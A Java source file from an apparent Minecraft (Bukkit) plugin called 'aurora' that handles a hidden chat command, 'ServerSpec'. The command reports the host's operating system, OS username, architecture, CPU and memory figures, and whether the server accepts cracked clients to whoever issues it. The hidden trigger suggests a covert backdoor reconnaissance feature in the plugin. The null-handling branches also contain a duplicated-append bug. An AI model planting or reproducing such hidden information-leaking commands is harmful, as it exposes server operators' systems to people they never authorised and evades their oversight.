package me.oscarcusick.aurora.Commands.Executors;

import me.oscarcusick.aurora.Commands.HiddenCommandEvent;
import me.oscarcusick.aurora.Utility.GeneralUtility;
import net.md_5.bungee.api.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.plugin.Plugin;

public class ServerSpecCommandExecutor implements Listener {
    Plugin PluginInstance;
    public ServerSpecCommandExecutor(Plugin PluginInstance) {
        this.PluginInstance = PluginInstance;
    }

    @EventHandler
    public void ServerSpecCommand(HiddenCommandEvent event) {
        if (!event.command.equalsIgnoreCase("ServerSpec")) {
            return;
        }// correct command and player calling it

        GeneralUtility GU = new GeneralUtility(PluginInstance);
        String Content;

        GU.TellPlayer(event.commandSender, "Fetched server specifications:");

        { // Operating system
            Content = (GU.Magenta + "Operating system: ");
            if (System.getProperty("os.name") != null) {
                Content += (GU.Gold + "" + ChatColor.BOLD + System.getProperty("os.name"));
            } else {
                Content += Content += (ChatColor.RED + "NULL");
            }
            GU.TellPlayer(event.commandSender, Content);
        }

        { // OS Architecture
            Content = (GU.Magenta + "OS Architecture: ");
            if (System.getProperty("os.arch") != null) {
                Content += (GU.Gold + "" + ChatColor.BOLD + System.getProperty("os.arch"));
            } else {
                Content += Content += (ChatColor.RED + "NULL");
            }
            GU.TellPlayer(event.commandSender, Content);
        }

        { // OS Version
            Content = (GU.Magenta + "OS Version: ");
            if (System.getProperty("os.version") != null) {
                Content += (GU.Gold + "" + ChatColor.BOLD + System.getProperty("os.version"));
            } else {
                Content += Content += (ChatColor.RED + "NULL");
            }
            GU.TellPlayer(event.commandSender, Content);
        }

        { // OS Username
            Content = (GU.Magenta + "OS Username: ");
            if (System.getProperty("user.name") != null) {
                Content += (GU.Gold + "" + ChatColor.BOLD + System.getProperty("user.name"));
            } else {
                Content += Content += (ChatColor.RED + "NULL");
            }
            GU.TellPlayer(event.commandSender, Content);
        }

        { // Accessible CPU Cores
            Content = (GU.Magenta + "Available CPU Cores: ");
            if (Runtime.getRuntime().availableProcessors() != 0) {
                Content += (GU.Gold + "" + ChatColor.BOLD + Integer.toString(Runtime.getRuntime().availableProcessors()));
            } else {
                Content += (ChatColor.RED + "NULL");
            }
            GU.TellPlayer(event.commandSender, Content);
        }

        { // JRE Memory usage
            Content = (GU.Magenta + "JRE Mem Usage (GB): ");
            if ((Runtime.getRuntime().totalMemory() != Long.MAX_VALUE) && (Runtime.getRuntime().freeMemory() != Long.MAX_VALUE)) {
                Content += (GU.Gold + Float.toString(Runtime.getRuntime().freeMemory() / 1000000000f) + GU.LightBlue + "" + ChatColor.BOLD + "/" + ChatColor.RED + Float.toString(Runtime.getRuntime().totalMemory() / 1000000000f));
            } else {
                Content += (ChatColor.RED + "NULL");
            }
            GU.TellPlayer(event.commandSender, Content);
        }

        { // Server online mode? (allows cracked clients or not, false means it does)
            Content = (GU.Magenta + "Server running online: ");
            if (PluginInstance.getServer().getOnlineMode()) {
                Content += (ChatColor.GREEN + "" + ChatColor.BOLD + "TRUE");
            } else {
                Content += (ChatColor.RED + "" + ChatColor.BOLD + "FALSE");
            }
            GU.TellPlayer(event.commandSender, Content);
        }


    }
}
